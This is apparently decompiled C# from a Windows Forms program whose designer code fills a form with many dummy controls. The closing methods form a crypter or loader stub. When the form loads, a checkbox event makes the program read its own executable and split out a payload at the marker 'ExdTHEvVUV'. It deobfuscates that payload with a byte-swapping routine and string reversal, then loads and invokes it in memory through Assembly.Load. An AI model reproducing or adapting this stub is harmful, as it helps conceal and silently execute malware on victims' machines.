		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(44);
		Label1.set_Text("Label1");
		MenuStrip menuStrip = MenuStrip1;
		location = new Point(0, 0);
		((Control)menuStrip).set_Location(location);
		((Control)MenuStrip1).set_Name("MenuStrip1");
		MenuStrip menuStrip2 = MenuStrip1;
		size = new Size(284, 24);
		((Control)menuStrip2).set_Size(size);
		((Control)MenuStrip1).set_TabIndex(49);
		((Control)MenuStrip1).set_Text("MenuStrip1");
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(284, 262);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)SplitContainer1);
		((Control)this).get_Controls().Add((Control)(object)RichTextBox1);
		((Control)this).get_Controls().Add((Control)(object)RadioButton1);
		((Control)this).get_Controls().Add((Control)(object)PropertyGrid1);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)this).get_Controls().Add((Control)(object)ToolStrip1);
		((Control)this).get_Controls().Add((Control)(object)WebBrowser1);
		((Control)this).get_Controls().Add((Control)(object)VScrollBar1);
		((Control)this).get_Controls().Add((Control)(object)TreeView1);
		((Control)this).get_Controls().Add((Control)(object)TrackBar1);
		((Control)this).get_Controls().Add((Control)(object)ToolStripContainer1);
		((Control)this).get_Controls().Add((Control)(object)PrintPreviewControl1);
		((Control)this).get_Controls().Add((Control)(object)DomainUpDown1);
		((Control)this).get_Controls().Add((Control)(object)DateTimePicker1);
		((Control)this).get_Controls().Add((Control)(object)DataGridView1);
		((Control)this).get_Controls().Add((Control)(object)FlowLayoutPanel1);
		((Control)this).get_Controls().Add((Control)(object)CheckedListBox1);
		((Control)this).get_Controls().Add((Control)(object)ComboBox1);
		((Control)this).get_Controls().Add((Control)(object)CheckBox1);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)BindingNavigator1);
		((Control)this).get_Controls().Add((Control)(object)NumericUpDown1);
		((Control)this).get_Controls().Add((Control)(object)MonthCalendar1);
		((Control)this).get_Controls().Add((Control)(object)Panel1);
		((Control)this).get_Controls().Add((Control)(object)MaskedTextBox1);
		((Control)this).get_Controls().Add((Control)(object)ListView1);
		((Control)this).get_Controls().Add((Control)(object)ListBox1);
		((Control)this).get_Controls().Add((Control)(object)HScrollBar1);
		((Control)this).get_Controls().Add((Control)(object)GroupBox1);
		((Control)this).get_Controls().Add((Control)(object)LinkLabel1);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)MenuStrip1);
		((Control)this).set_Name("Gigolos");
		((Form)this).set_Text("Classicvb");
		((Control)TabControl1).ResumeLayout(false);
		((Control)TabPage1).ResumeLayout(false);
		((Control)TableLayoutPanel1).ResumeLayout(false);
		((Control)TableLayoutPanel1).PerformLayout();
		((Control)SplitContainer1.get_Panel1()).ResumeLayout(false);
		((Control)SplitContainer1.get_Panel1()).PerformLayout();
		((Control)SplitContainer1).ResumeLayout(false);
		((ISupportInitialize)TrackBar1).EndInit();
		((Control)ToolStripContainer1).ResumeLayout(false);
		((Control)ToolStripContainer1).PerformLayout();
		((ISupportInitialize)EventLog1).EndInit();
		((ISupportInitialize)DataGridView1).EndInit();
		((ISupportInitialize)FileSystemWatcher1).EndInit();
		((ISupportInitialize)ErrorProvider1).EndInit();
		((ISupportInitialize)BindingSource1).EndInit();
		((ISupportInitialize)BindingNavigator1).EndInit();
		((Control)BindingNavigator1).ResumeLayout(false);
		((Control)BindingNavigator1).PerformLayout();
		((ISupportInitialize)NumericUpDown1).EndInit();
		((Control)Panel1).ResumeLayout(false);
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public byte[] ARTIST(byte[] x, int y)
	{
		int num = x.Length - 1;
		for (int i = 0; i <= num; i += 2)
		{
			byte b = (byte)(x[i] + y);
			byte b2 = (x[i] = (byte)(x[i + 1] + y));
			x[i + 1] = b;
		}
		return x;
	}

	public string G(byte[] A)
	{
		return Encoding.Default.GetString(A);
	}

	public byte[] G(string A)
	{
		return Encoding.Default.GetBytes(A);
	}

	public int XX(char s)
	{
		return Strings.Asc(s);
	}

	public object START(string h)
	{
		_2 = File.ReadAllBytes(Application.get_ExecutablePath());
		_3 = G(_2);
		_4 = Regex.Split(_3, "ExdTHEvVUV");
		Rock = G(_4[1]);
		char s = Conversions.ToChar(_4[3]);
		int y = XX(s);
		byte[] a = ARTIST(Rock, y);
		Rock = G(Strings.StrReverse(G(a)));
		object result = default(object);
		return result;
	}

	private void CheckBox1_CheckedChanged(object sender, EventArgs e)
	{
		START(Own);
		Assembly assembly = Assembly.Load(Rock);
		Type type = assembly.GetType("A.A");
		type.InvokeMember("A", BindingFlags.InvokeMethod, null, null, new object[1] { "ExdTHEvVUV" });
	}

	private void Krulises_Load(object sender, EventArgs e)
	{
		CheckBox1.set_Checked(true);
	}
}
